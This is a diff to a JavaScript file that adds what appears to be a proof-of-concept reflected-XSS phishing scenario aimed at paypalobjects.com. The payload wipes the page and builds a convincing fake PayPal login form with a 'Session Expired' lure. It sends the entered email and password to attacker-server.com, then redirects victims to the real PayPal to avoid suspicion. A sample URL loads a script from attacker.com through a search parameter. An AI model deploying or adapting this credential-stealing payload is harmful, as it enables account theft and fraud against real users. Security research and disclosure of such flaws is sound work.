@@ -1,1 +1,161 @@
-alert(document.cooie);
+//alert(document.cooie);
+
+const SCENARIO_1_PHISHING = {
+  name: "Advanced Phishing Attack",
+  severity: "HIGH",
+  description: "Creates convincing fake PayPal login on official domain",
+
+  payload: function() {
+    // This code would execute on paypalobjects.com via reflected XSS
+    (function() {
+
+      // Clear the page
+      document.body.innerHTML = '';
+      document.head.innerHTML = '';
+
+      // Inject PayPal-looking styles
+      const style = document.createElement('style');
+      style.textContent = `
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+          font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+          background: #f5f7fa;
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          min-height: 100vh;
+        }
+        .container {
+          background: white;
+          padding: 40px;
+          border-radius: 8px;
+          box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+          max-width: 400px;
+          width: 100%;
+        }
+        .logo {
+          text-align: center;
+          margin-bottom: 30px;
+        }
+        h2 {
+          color: #2c2e2f;
+          font-size: 24px;
+          margin-bottom: 10px;
+        }
+        .alert {
+          background: #fff3cd;
+          border: 1px solid #ffc107;
+          padding: 12px;
+          border-radius: 4px;
+          margin-bottom: 20px;
+          color: #856404;
+        }
+        input {
+          width: 100%;
+          padding: 12px;
+          margin-bottom: 15px;
+          border: 1px solid #cbd2d9;
+          border-radius: 4px;
+          font-size: 14px;
+        }
+        button {
+          width: 100%;
+          padding: 12px;
+          background: #0070ba;
+          color: white;
+          border: none;
+          border-radius: 20px;
+          font-size: 16px;
+          cursor: pointer;
+          font-weight: bold;
+        }
+        button:hover { background: #005ea6; }
+      `;
+      document.head.appendChild(style);
+
+      // Create fake login form
+      const html = `
+        <div class="container">
+          <div class="logo">
+            <svg width="100" height="32" viewBox="0 0 100 32">
+              <!-- PayPal logo SVG - simplified -->
+              <text x="0" y="24" fill="#0070ba" font-size="24" font-weight="bold">PayPal</text>
+            </svg>
+          </div>
+
+          <div class="alert">
+            <strong>⚠️ Session Expired</strong><br>
+            Please log in again to continue your transaction
+          </div>
+
+          <h2>Log in to your account</h2>
+
+          <form id="phishing-form">
+            <input
+              type="email"
+              name="email"
+              placeholder="Email or mobile number"
+              required
+              autocomplete="username"
+            >
+            <input
+              type="password"
+              name="password"
+              placeholder="Password"
+              required
+              autocomplete="current-password"
+            >
+            <button type="submit">Log In</button>
+          </form>
+
+          <div style="margin-top: 20px; text-align: center; font-size: 13px; color: #687173;">
+            <a href="#" style="color: #0070ba;">Forgot password?</a>
+          </div>
+        </div>
+      `;
+
+      document.body.innerHTML = html;
+
+      // Steal credentials when submitted
+      document.getElementById('phishing-form').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = e.target.email.value;
+        const password = e.target.password.value;
+
+        // Send to attacker's server
+        try {
+          await fetch('https://attacker-server.com/steal', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              email: email,
+              password: password,
+              domain: window.location.hostname,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              referrer: document.referrer
+            })
+          });
+
+          // Redirect to real PayPal to avoid suspicion
+          window.location.href = 'https://www.paypal.com/signin?redirect_uri=/myaccount/summary';
+
+        } catch (err) {
+          // Fallback: redirect anyway
+          window.location.href = 'https://www.paypal.com/signin';
+        }
+      });
+
+    })();
+  },
+
+  url_example: "https://www.paypalobjects.com/search?q=<script src='https://attacker.com/phish.js'></script>",
+
+  impact: [
+    "Credentials stolen from users who trust the paypalobjects.com domain",
+    "Domain appears official, increases success rate",
+    "SSL certificate shows 'Secure' (still paypalobjects.com)",
+    "Average users won't notice domain difference"
+  ]
+};
